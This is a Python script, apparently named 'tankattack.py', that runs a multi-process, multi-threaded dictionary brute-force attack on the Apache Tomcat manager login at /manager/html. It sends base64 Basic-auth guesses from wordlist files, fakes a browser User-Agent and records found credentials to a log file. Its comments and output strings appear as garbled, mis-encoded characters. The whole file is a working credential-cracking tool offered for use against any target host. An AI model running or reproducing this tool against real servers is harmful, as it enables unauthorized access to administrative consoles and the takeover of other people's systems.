from multiprocessing import Queue, Process
from multiprocessing.sharedctypes import Value
from pathlib import Path
import argparse
import base64
import datetime
import http.client
import signal
import sys
import textwrap
import threading
import time

successfile = open('successfile.log', 'a')
# �����������ڼ����ܹ��ƽ��˶��ٸ�����
counter = Value('i', 0)
# �����Ƿ����ҵ�
iskeyfound = Value('b', False)

def crack(host, crequeue, recycledqueue, iskeyfound, counter, logqueue):
    httpconn = http.client.HTTPConnection(host)
    while 1:
        # ʱ��ע���Ƿ��������ֵ��Ѿ��ҵ���KEY���ҵ�����Ҳ���ɻ���
        if(iskeyfound.value):
            httpconn.close()
            break
        if(not crequeue.empty()):
            comb = crequeue.get()
        elif(not recycledqueue.empty()):
            comb = recycledqueue.get()
        # �������붼������ϣ��������ն��е����롣�˳�
        else:
            break
        constr = base64.b64encode(comb.encode('utf-8'))
        b64str = constr.decode('utf-8')
        headers = {
            "Connection": "close",
            "Authorization": "Basic " + b64str,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"}
        try:
            httpconn.request(method="GET", url="/manager/html", headers=headers)
            reps_code = httpconn.getresponse().status
        except http.client.HTTPException as e:
            # ���ƽ��쳣��ƾ֤�ӵ��б������ٴ���
            logqueue.put(("[-] �����쳣��ƾ֤ %s���·Żض��С��쳣ԭ��%s" % (comb, e)))
            recycledqueue.put(comb)
        if(str(reps_code) == "200"):
            tmp_str = str('[+] �ƽ�ɹ�!!!Key => %s  ,�����룺%s' % (comb, reps_code))
            logqueue.put(tmp_str)
            # ��½ƾ֤���ҵ�,��ǰ�߳��˳��������������ֵܱ���Ϲæ����
            iskeyfound.value = True
            successfile.write(tmp_str + "\n")
            break
        else:
            logqueue.put('[+] ���Ե�½��� %s ,�����룺%s' % (comb, reps_code))
        counter.value += 1


def getargs():
    # * A high-efficiency automatic program used for cracking Apache Tomcat\'s log-on credential, Powered by Tank  *
    parser = argparse.ArgumentParser(prog='tankattack.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\
    For Example:
    -----------------------------------------------------------------------------
    python tankattack.py --host 127.0.0.1:8080 --user admin -p 4 -t 4 -d I:/dict 
    python tankattack.py --host www.testorg.com --user admin -p 4 -t 4 -d I:/dict'''))
    parser.add_argument('--host', metavar='host', type=str, help=' the host of target,including port')
    parser.add_argument('--user', metavar='name', type=str, help=' the name you are to crack')
    parser.add_argument('-p', metavar='process', type=int, help=' The amount of processes that used to crack')
    parser.add_argument('-t', metavar='threads', type=int, help=' The amount of threads per process')
    parser.add_argument('-d', metavar='directory', type=str, help=' The directory of passworld files')
   
    if(len(sys.argv[1:]) / 2 != 5):
        sys.argv.append('-h')
    return parser.parse_args()


def CreateCredentials(crequeue):
    '''
       ����в����û���������
    '''
    p = Path(dict)
    dictfiles = p.glob('*/*.txt')
    # ���ܵĵ�½��
    for dictfile in dictfiles:
        f_dict = open(str(dictfile), 'r')
        for line in f_dict:
            line = line.strip()
            if(line):
                crequeue.put(user + ":" + line)
        f_dict.close()


def task(host, crequeue, threadnum, recycledqueue, iskeyfound, counter, logqueue):
    mythreads = []
    for i in range(threadnum):
        # ���߳��˳�ʱ�����߳�ҲҪ�˳�
        t = threading.Thread(target=crack, args=(host, crequeue, recycledqueue, iskeyfound, counter, logqueue), daemon=True)
        t.start()
        mythreads.append(t)
    
    for t in mythreads:
        t.join()

def printlog(logqueue):
    while 1:
        print(logqueue.get())

if __name__ == '__main__':
    paramsargs = getargs()
    maxProcesses = paramsargs.p
    threadnum = paramsargs.t
    dict = paramsargs.d
    host = paramsargs.host
    user = paramsargs.user
    recycledqueue = Queue()
    crequeue = Queue(maxsize=10000)
    # ��־����
    logqueue = Queue()
    print('[+] �ƽ⿪ʼ .... ')
    starttime = datetime.datetime.now()
    # ����һ�����̽������ȡ��������
    threading.Thread(target=CreateCredentials, args=(crequeue,), daemon=True).start()
    # ��־��ȡ
    threading.Thread(target=printlog, args=(logqueue,), daemon=True).start()
    cnProcesses = []
    for i in range(maxProcesses):
        # �������˳�ʱ���ӽ���ҲҪ�˳�
        cn = Process(target=task, args=(host, crequeue, threadnum, recycledqueue, iskeyfound, counter, logqueue), daemon=True)
        cn.start()
        cnProcesses.append(cn)
    # �ȴ����н��̽���
    for p in cnProcesses:
        p.join()
    # �����˳�����ӡ����ִ��ʱ��
    counter = counter.value
    finishetime = datetime.datetime.now()
    ptime = finishetime - starttime
    print(str('[+] ����ִ����ɣ����½� %i ����ϣ�����ʱ %s\
                    ' % (counter, time.strftime('%H:%M:%S', time.gmtime(ptime.seconds)))))